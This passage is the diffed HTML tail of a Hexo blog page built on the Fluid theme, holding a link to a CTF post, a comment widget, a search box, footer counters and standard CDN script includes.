+                      <a href="/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/" title="21年强网杯pop_master">
+                        <span class="hidden-mobile">21年强网杯pop_master</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://cdn.staticfile.org/waline/2.15.5/waline.min.css')
+      Fluid.utils.createScript('https://cdn.staticfile.org/waline/2.15.5/waline.min.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://comment.just1greed.online","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
